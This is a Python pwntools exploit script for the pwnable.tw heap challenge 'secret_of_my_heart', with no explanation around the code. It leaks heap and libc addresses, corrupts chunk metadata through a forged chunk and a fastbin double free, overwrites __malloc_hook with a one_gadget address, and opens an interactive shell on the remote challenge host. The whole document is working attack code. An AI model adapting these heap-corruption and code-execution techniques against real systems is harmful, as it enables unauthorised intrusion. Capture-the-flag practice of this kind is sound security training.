from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./secret_of_my_heart")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("chall.pwnable.tw","10302")
	libc = ELF("./libc_64.so.6")

def menu(choice):
	p.sendafter("Your choice :",str(choice))

def add(size,name,content):
	menu(1)
	p.sendafter("Size of heart : ",str(size))
	p.sendafter("Name of heart :",name)
	p.sendafter("secret of my heart :",content)
	p.recvuntil("Done !\n")

def show(index):
	menu(2)
	p.sendafter("Index :",str(index))

def free(index):
	menu(3)
	p.sendafter("Index :",str(index))

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x11A7)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
size = 0x68
add(size,"a"*0x20,"a") #0
show(0)
p.recvuntil("a" * 0x20)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0x10
log.success("heap_base:" + hex(heap_base))
add(0xf0,"a","b"*8) #1
add(size,"a"*0x20,"a") #2
free(0)
payload = p64(heap_base) + p64(heap_base) + p64(0) * (size / 8 - 3) + p64(0x70)
add(size,"a"*0x20,payload) #0
free(1)
#debugf()
show(0)
p.recvuntil("Secret : ")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
add(size,"a"*0x20,"a") #1
add(0xf0,"a","b"*8) #3
free(0)
free(2)
free(1)
payload = p64(libc.symbols["__malloc_hook"] - 0x23)
add(size,"a",payload)
add(size,"a","a")
add(size,"a","a")
if debug:
	one_gadget = libc.address + 0xf02a4
else:
	one_gadget = libc.address + 0xef6c4
	
payload = "aaa" + p64(0) * 2 + p64(one_gadget)
add(size,"a",payload)
free(0)
free(2)
p.interactive()
